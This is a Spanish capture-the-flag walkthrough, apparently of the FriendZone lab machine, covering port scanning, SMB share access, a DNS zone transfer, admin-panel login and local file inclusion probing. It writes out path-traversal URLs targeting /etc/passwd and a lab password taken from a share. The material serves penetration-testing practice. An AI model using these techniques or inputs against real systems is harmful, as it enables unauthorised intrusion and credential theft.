## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.123
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.123
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.123 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,22,53,80,139,443,445 10.10.10.123 -oN targeted
```


| Puerto | Servicio | Que se nos occure?         | Que falta?  |
| ------ | -------- | -------------------------- | ----------- |
| 21     | ftp      | Conneccion como anonymous  |             |
| 22     | tcp      | Conneccion directa         | creds       |
| 53     | domain   | axfr attack                | ip y domain |
| 80     | http     | Web, Fuzzing               |             |
| 139    | Samba    | Coneccion con null session |             |
| 443    | https    | Web, Fuzzing               |             |
| 445    | Samba    | Coneccion con null session |             |

### Coneccion ftp como anonymous {-}

```bash
ftp 10.10.10.123
Name: anonymous
Password: 
#Output
Login failed
```

### Checkeamos el certificado ssl {-}

```bash
openssl s_client -connect 10.10.10.123:443
```

Aqui vemos un un correo `haha@friendzone.red`. Añadimos el dominio friendzone.red al `/etc/hosts`.

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.123
```

Es un Apache 2.4.29 en un Ubuntu y podemos ver un nuevo dominio `friendzoneportal.red` que añadimos al `/etc/hosts`. 


#### Checkear la web {-}

Si entramos en la url `https://10.10.10.123`, No vemos gran cosas. 
Si vamos por la url `https://friendzone.red` vemos una nueva web, mirando el codigo fuente, vemos un comentario sobre un directorio
`/js/js` y si vamos por la url `https://friendzone.red/js/js` vemos una especie de hash en base64 que intentamos romper con el comando
`echo "MTZaVFhRMDBrSTE2MzUxMDgwMzRieUxPVHlmdGkz" | base64 -d | base64 -d` pero no nos da gran cosa. Si miramos la url `https://friendzoneportal.red`,
vemos otra imagen pero tampoco vemos gran cosa en este caso.


### Analyzando el SAMBA {-}

```bash
crackmapexec smb 10.10.10.123
smbclient -L 10.10.10.123 -N
```

Aqui el **smbclient** nos dice que estamos frente una maquina Windows 6.1 aun que sabemos que la maquina victima es un linux.

Vemos recursos compartidos a nivel de red como:

- print$
- Files
- general
- Development
- IPC$

Usando de la heramienta smbmap, podemos ver si tenemos accessos a estos recursos.

```bash
smbmap -H 10.10.10.123
```

y vemos que denemos accesso con derecho de lectura al directorio `general` y derechos de lectura y escritura al directorio `development`.
Vamos a conectarnos para ver lo que hay por estos registros

```bash
smbclient //10.10.10.123/general -N
dir
```

Vemos un fichero creds.txt y nos lo descargamos con el commando `get creds.txt`. 

Miramos si nos podemos conectar con `ssh admin@10.10.10.123` pero no podemos y miramos si tenemos accesso a mas registros.

```bash
smbmap -H 10.10.10.123 -u 'admin' -p 'WORKWORKHhallelujah@#'
```

### Ataque de transferencia de zona con Dig {-}

```bash
dig @10.10.10.123 friendzone.red
dig @10.10.10.123 friendzone.red ns
dig @10.10.10.123 friendzone.red mx
dig @10.10.10.123 friendzone.red axfr
```

El ataque de transferencia de zone nos permite ver una serie de subdominios como.

- administrator1.friendzone.red
- hr.friendzone.red
- uploads.friendzone.red

los introducimos en el `/etc/hosts` y lo analyzamos en firefox.

### Checkeamos los nuevos dominios {-}

Podemos ver que el `https://hr.friendzone.red` no nos muestra nada.
La url `https://uploads.friendzone.red` nos envia a una pagina donde podemos uploadear imagenes y la url
`https://administrator1.friendzone.red` nos muestra un panel de inicio de session.

Como hemos encontrado credenciales con smb, intentamos conectarnos desde el panel de inicio de session y estas credenciales son validas.

Aqui vemos que existe un fichero `dashboard.php`. Si vamos a la url `https://administrator1.friendzone.red/dashboard.php`, tenemos un mensaje que
dice que el falta el parametro image_name y que por defecto, necesitamos poner `image_id=a&pagename=timestamp`. Intentamos la url siguiente:

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=timestamp
```

Aqui nos aparece una nueva pagina. Nos llama la atencion el parametro pagename y intentamos cosas

```bash
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=timestamp
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=timestam
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=dashboard.php
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=dashboard
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=/../../../../../etc/passwd
https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=/../../../../../etc/passwd%00
```

Aqui hemos constatado que podemos injectar una pagina de la web en esta misma pagina y que no se necessita poner la extension que la pagina añade
`.php` por si sola. Es por esto que no se puede ver el `/etc/passwd` porque añade un `.php` al final.



